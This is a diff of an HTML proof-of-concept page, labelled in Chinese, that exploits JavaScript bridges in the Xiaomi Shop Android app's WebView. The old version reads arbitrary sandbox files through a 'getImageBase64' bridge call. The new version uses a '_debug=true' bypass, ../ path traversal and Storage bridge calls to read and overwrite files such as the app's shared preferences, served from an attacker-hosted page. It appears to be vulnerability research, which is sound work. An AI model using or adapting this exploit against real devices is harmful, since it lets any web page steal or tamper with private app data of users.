@@ -1,197 +1,94 @@
 <!doctype html>
 <html lang="zh-CN">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>xmshop 任意文件读取 PoC</title>
+  <meta charset="utf-8" />
+  <title>MiFiJsBridge Storage PoC</title>
   <style>
-    body { font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,"PingFang SC","Microsoft YaHei",sans-serif; margin: 20px; line-height: 1.45; }
-    h2 { margin-top: 0; }
-    .row { margin: 10px 0; }
-    input[type="text"] { width: 100%; padding: 8px; box-sizing: border-box; }
-    button { padding: 8px 14px; margin-right: 8px; cursor: pointer; }
-    pre { white-space: pre-wrap; word-break: break-word; border: 1px solid #ddd; padding: 10px; border-radius: 6px; background: #fafafa; min-height: 80px; }
-    .ok { color: #0b8f29; }
-    .bad { color: #c62828; }
-    .muted { color: #666; font-size: 13px; }
+    body { font-family: sans-serif; padding: 12px; }
+    textarea { width: 100%; height: 180px; }
+    input { width: 100%; }
+    button { margin: 6px 0; }
+    pre { white-space: pre-wrap; word-break: break-all; background: #f5f5f5; padding: 8px; }
   </style>
 </head>
 <body>
-  <h2>xmshop 任意沙盒文件读取 PoC</h2>
+  <h3>Storage 任意沙盒文件读写 PoC</h3>
+  <p>当前页面 URL 需要带 <code>_debug=true</code>，例如：<code>https://attacker.example/poc_storage_readwrite.html?_debug=true</code></p>
 
-  <div class="row">
-    <div class="muted">目标文件路径（受害 app 沙盒路径）：</div>
-    <input id="pathInput" type="text" value="/data/user/0/com.xiaomi.shop/shared_prefs/com.xiaomi.shop_preferences.xml" />
-  </div>
+  <label>目标读取路径（相对 filesDir，可用 ../ 穿越）</label>
+  <input id="readPath" value="../shared_prefs/com.xiaomi.shop_preferences.xml" />
+  <button onclick="readArbitrary()">读取文件</button>
 
-  <div class="row">
-    <button id="readBtn">读取文件</button>
-    <button id="clearBtn">清空输出</button>
-  </div>
+  <label>目标覆盖路径（相对 filesDir，可用 ../ 穿越）</label>
+  <input id="writePath" value="../shared_prefs/pwn_test.xml" />
+  <label>覆盖内容</label>
+  <textarea id="writeData"><map><string name="pwn">1</string></map></textarea>
+  <button onclick="overwriteArbitrary()">覆盖文件</button>
 
-  <div class="row">
-    <strong>桥状态：</strong> <span id="bridgeState" class="bad">未初始化</span>
-  </div>
-
-  <div class="row">
-    <strong>日志：</strong>
-    <pre id="logBox"></pre>
-  </div>
-
-  <div class="row">
-    <strong>读取结果（UTF-8 解码）：</strong>
-    <pre id="resultBox"></pre>
-  </div>
-
-  <div class="row">
-    <strong>Base64（原始）：</strong>
-    <pre id="b64Box"></pre>
-  </div>
+  <h4>输出</h4>
+  <pre id="out"></pre>
 
   <script>
-    (() => {
-      const $ = (id) => document.getElementById(id);
-      const logBox = $("logBox");
-      const resultBox = $("resultBox");
-      const b64Box = $("b64Box");
-      const bridgeState = $("bridgeState");
-      const pathInput = $("pathInput");
+    function log(x) {
+      const el = document.getElementById("out");
+      el.textContent += (typeof x === "string" ? x : JSON.stringify(x, null, 2)) + "\n";
+    }
 
-      const state = {
-        nativeWE: null,
-        pending: new Map()
-      };
+    function invoke(feature, action, param) {
+      const raw = window.MiFiJsBridge.invoke(feature, action, param, null);
+      try { return JSON.parse(raw); } catch (_) { return { raw }; }
+    }
 
-      function log(msg) {
-        const t = new Date().toLocaleTimeString();
-        logBox.textContent += `[${t}] ${msg}\n`;
+    function lookup(feature, action) {
+      return window.MiFiJsBridge.lookup(feature, action);
+    }
+
+    function ensureBridge() {
+      if (!window.MiFiJsBridge) {
+        throw new Error("MiFiJsBridge 不存在（页面未在目标 WebView 中打开）");
       }
-
-      function setBridgeState(ok, text) {
-        bridgeState.className = ok ? "ok" : "bad";
-        bridgeState.textContent = text;
+      const l1 = lookup("Storage", "setPreferenceV2");
+      const l2 = lookup("Storage", "loadFile");
+      const l3 = lookup("Storage", "saveFile");
+      log({ lookup: { setPreferenceV2: l1, loadFile: l2, saveFile: l3 } });
+      if (l1 !== 0 || l2 !== 0 || l3 !== 0) {
+        throw new Error("Storage 功能不可用（可能未命中 _debug=true 旁路）");
       }
+    }
 
-      function decodeBase64ToUtf8(base64) {
-        const binary = atob(base64);
-        const bytes = new Uint8Array(binary.length);
-        for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
-        try {
-          return new TextDecoder("utf-8", { fatal: false }).decode(bytes);
-        } catch (e) {
-          return decodeURIComponent(escape(binary));
-        }
-      }
-
-      function onNativeEmit(eventName, payload, cbId) {
-        log(`收到回调: event=${eventName}, cbId=${cbId || ""}`);
-        let parsed = null;
-        try {
-          parsed = typeof payload === "string" ? JSON.parse(payload) : payload;
-        } catch (e) {
-          log("payload 不是 JSON，按原文处理");
-        }
-
-        const code = parsed && typeof parsed.code !== "undefined" ? parsed.code : null;
-        const data = parsed && typeof parsed.data !== "undefined" ? parsed.data : payload;
-
-        if (eventName === "getImageBase64") {
-          if (code === 0 && typeof data === "string" && data.length > 0) {
-            b64Box.textContent = data;
-            try {
-              resultBox.textContent = decodeBase64ToUtf8(data);
-              log(`读取成功，base64 长度=${data.length}`);
-            } catch (e) {
-              resultBox.textContent = "[解码失败，可能是二进制文件]\n" + String(e);
-              log("读取成功，但 UTF-8 解码失败（可能是二进制）");
-            }
-          } else {
-            resultBox.textContent = `读取失败: code=${code}, data=${typeof data === "string" ? data : JSON.stringify(data)}`;
-            log(`读取失败: code=${code}`);
-          }
-        } else {
-          log(`收到其它事件: ${eventName}`);
-        }
-
-        if (cbId && state.pending.has(cbId)) {
-          clearTimeout(state.pending.get(cbId));
-          state.pending.delete(cbId);
-        }
-      }
-
-      function setupBridge() {
-        const nativeWE = window.WE;
-        if (!nativeWE || typeof nativeWE.trigger !== "function") {
-          setBridgeState(false, "WE 不存在或 trigger 不可用");
-          return false;
-        }
-        state.nativeWE = nativeWE;
-        window.__nativeWE = nativeWE;
-
-        try { nativeWE.emit = onNativeEmit; } catch (e) {}
-
-        const wrapper = {
-          emit: onNativeEmit,
-          trigger: function(...args) { return nativeWE.trigger.apply(nativeWE, args); },
-          triggerString: function(...args) {
-            if (typeof nativeWE.triggerString === "function") {
-              return nativeWE.triggerString.apply(nativeWE, args);
-            }
-            return null;
-          }
-        };
-        try {
-          if (!window.WE || typeof window.WE.emit !== "function") {
-            window.WE = wrapper;
-          }
-        } catch (e) {
-          window.WE = wrapper;
-        }
-
-        setBridgeState(true, "WE 已就绪");
-        log("JSBridge 初始化成功");
-        return true;
-      }
-
-      function triggerRead(path) {
-        if (!setupBridge()) {
-          log("桥接初始化失败，无法触发读取");
-          return;
-        }
-        if (!path) {
-          log("请输入文件路径");
-          return;
-        }
-        const cbId = "cb_" + Date.now() + "_" + Math.random().toString(16).slice(2);
-        log(`开始读取: ${path}`);
-        try {
-          const ok = window.WE.trigger("getImageBase64", path, cbId);
-          log(`trigger 返回: ${ok}`);
-        } catch (e) {
-          log("trigger 异常: " + e);
-          return;
-        }
-        const timer = setTimeout(() => {
-          state.pending.delete(cbId);
-          log("等待回调超时（6s）");
-        }, 6000);
-        state.pending.set(cbId, timer);
-      }
-
-      $("readBtn").addEventListener("click", () => triggerRead(pathInput.value.trim()));
-      $("clearBtn").addEventListener("click", () => {
-        logBox.textContent = "";
-        resultBox.textContent = "";
-        b64Box.textContent = "";
-      });
-
+    function readArbitrary() {
       try {
-        const qPath = new URLSearchParams(location.search).get("path");
-        if (qPath) pathInput.value = qPath;
-      } catch (e) {}
+        ensureBridge();
+        const p = document.getElementById("readPath").value;
+        const meta = JSON.stringify({ format: 0, authorities: ["*"] });
+        const p1 = JSON.stringify({ pref: "hybrid_storage", content: { [p]: meta } });
+        const r1 = invoke("Storage", "setPreferenceV2", p1);
+        log({ setPreferenceV2: r1 });
+        const r2 = invoke("Storage", "loadFile", p);
+        log({ loadFile: r2 });
+      } catch (e) {
+        log("ERR: " + e.message);
+      }
+    }
 
-      setTimeout(setupBridge, 200);
-    })();
+    function overwriteArbitrary() {
+      try {
+        ensureBridge();
+        const p = document.getElementById("writePath").value;
+        const d = document.getElementById("writeData").value;
+        const req = JSON.stringify({
+          name: p,
+          data: d,
+          format: 0,
+          authorities: ["*"]
+        });
+        const r = invoke("Storage", "saveFile", req);
+        log({ saveFile: r });
+      } catch (e) {
+        log("ERR: " + e.message);
+      }
+    }
   </script>
 </body>
 </html>
+
